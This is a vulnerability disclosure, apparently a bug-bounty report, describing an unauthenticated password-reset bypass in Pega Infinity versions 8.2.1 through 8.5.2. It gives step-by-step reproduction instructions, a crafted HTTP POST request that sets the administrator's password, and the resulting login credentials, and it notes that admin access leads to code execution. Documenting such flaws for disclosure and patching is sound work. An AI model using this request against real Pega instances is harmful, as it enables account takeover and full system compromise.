## Summary
An attacker can bypass all stages of the password reset flow and reset any user's account on Pega infinity. This is done by (1) initiating the password reset flow and typing in the victim email, then (2) forcing the HTTP POST request to update the password through. An attacker could login using the newly edited account and fully compromise the Pega instance via the many acceptable post-auth code execution vectors (modifying dynamic pages, templating, etc.)

## Steps to Reproduce
1. Browse to the login page of any Pega instance
2. Click "reset password"
3. Type in "administrator@pega.com", proxy the HTTP request, send the HTTP request with the "administrator@pega.com" to the Burp repeater tab or any similar tab, then allow the request to go through by disabling the proxy or clicking "send"
4. After allowing the initial request to go through, modify the HTTP requests body in the repeater so it includes the following data...

```
POST /prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD HTTP/1.1 (:PEGA_ID is a unique ID for each site, it is in this format: ZOgwf2Zk3OsEg_oG74MXXxG2bXKbv56W)
Host: redacted.com

pzAuth=guest&NewPassword=Rules%401234&ConfPassword=Rules%401234&pyActivity%3DCode-Security.pzChangeUserPassword=
```

5. Login using the following credentials after sending the HTTP request, having bypassed the confirmation part of reset password and being able to login to the administrator account...

```
administrator@pega.com / Rules@1234
```

6. From there, you can achieve RCE via any of the many accepted use administrator-only code execution vectors

## Affected Versions
Pega Infinity >= 8.2.1
Pega Infinity <= 8.5.2

## Impact
Full compromise of any Pega instance with no prerequisite knowledge.
